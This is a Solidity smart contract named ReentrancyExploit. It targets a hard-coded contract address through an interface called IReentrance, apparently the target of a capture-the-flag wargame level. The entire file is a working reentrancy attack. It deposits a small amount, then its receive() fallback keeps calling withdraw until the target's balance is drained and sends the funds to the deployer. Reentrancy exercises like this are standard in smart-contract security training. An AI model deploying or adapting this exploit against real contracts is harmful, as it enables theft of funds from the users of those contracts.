// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.12;

contract ReentrancyExploit {
    uint256 public constant INITIAL_DEPOSIT = 0.1 ether;

    address constant cAddress = 0x42948f4F9dc90C82D69F31E8D210AAD04459A075;
    IReentrance constant c = IReentrance(cAddress);

    address private immutable exploiter;

    constructor() public {
        exploiter = msg.sender;
    }

    function donate() external payable {
        c.donate{value: msg.value}(address(this));
    }

    function withdraw() external {
        c.withdraw(INITIAL_DEPOSIT);
    }

    receive() external payable {
        uint targetBalance = cAddress.balance;
        if (targetBalance >= INITIAL_DEPOSIT) {
            c.withdraw(INITIAL_DEPOSIT);
        } else if (targetBalance > 0) {
            c.withdraw(targetBalance);
        } else {
            payable(exploiter).transfer(address(this).balance);
        }
    }
}

interface IReentrance {
    function donate(address _to) external payable;

    function balanceOf(address _who) external view returns (uint256 balance);

    function withdraw(uint256 _amount) external;
}
